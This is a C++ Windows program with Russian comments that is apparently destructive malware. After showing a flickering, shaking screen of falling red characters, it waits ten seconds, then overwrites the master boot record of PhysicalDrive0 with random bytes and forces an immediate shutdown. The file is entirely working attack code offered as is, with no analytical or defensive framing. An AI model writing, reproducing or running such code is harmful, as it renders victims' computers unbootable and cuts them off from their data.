#include <windows.h>
#include <cstdlib>
#include <ctime>
#include <string>
#include <thread>
#include <chrono>

// ==========================================
// ЧАСТЬ 1: РИСУЕМ ПАДАЮЩИЕ СИМВОЛЫ
// ==========================================
void DrawFallingChars(HDC hdc, int w, int h) {
    // Красная кисть и шрифт
    SetTextColor(hdc, RGB(255, 0, 0));
    SetBkMode(hdc, TRANSPARENT);
    
    HFONT hFont = CreateFontW(30, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                              DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
                              CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
                              VARIABLE_PITCH, L"Consolas");
    SelectObject(hdc, hFont);
    
    // Рисуем 50 случайных символов
    for (int i = 0; i < 50; i++) {
        int x = rand() % w;
        int y = rand() % h;
        wchar_t ch = (wchar_t)(rand() % 93 + 33); // Символы ASCII
        TextOutW(hdc, x, y, &ch, 1);
    }
    
    DeleteObject(hFont);
}

// ==========================================
// ЧАСТЬ 2: СНОС MBR
// ==========================================
void DestroyMBR() {
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE,
                                 FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice != INVALID_HANDLE_VALUE) {
        BYTE garbage[512];
        for (int i = 0; i < 512; i++) garbage[i] = rand() % 256;
        DWORD bytesWritten;
        WriteFile(hDevice, garbage, 512, &bytesWritten, NULL);
        CloseHandle(hDevice);
    }
}

// ==========================================
// ЧАСТЬ 3: ГЛАВНЫЙ ЦИКЛ УЖАСА
// ==========================================
void HorrorLoop() {
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    
    srand(time(NULL));
    
    // Бесконечный цикл (пока не снесем MBR и не выключим)
    while (true) {
        // Заливаем черным
        HBRUSH blackBrush = CreateSolidBrush(RGB(0, 0, 0));
        RECT rect = {0, 0, w, h};
        FillRect(hdc, &rect, blackBrush);
        DeleteObject(blackBrush);
        
        // Рисуем падающие символы
        DrawFallingChars(hdc, w, h);
        
        // Тряска окна (сдвиг всего экрана)
        int shakeX = rand() % 20 - 10;
        int shakeY = rand() % 20 - 10;
        BitBlt(hdc, shakeX, shakeY, w, h, hdc, 0, 0, SRCCOPY);
        
        Sleep(50); // Задержка для мерцания
    }
    
    ReleaseDC(NULL, hdc);
}

// ==========================================
// ГЛАВНАЯ ФУНКЦИЯ
// ==========================================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Запускаем снос MBR в фоне через 10 секунд
    std::thread([]() {
        std::this_thread::sleep_for(std::chrono::seconds(10));
        DestroyMBR();
        system("shutdown /s /f /t 0");
    }).detach();
    
    // Запускаем ужас
    HorrorLoop();
    
    return 0;
}
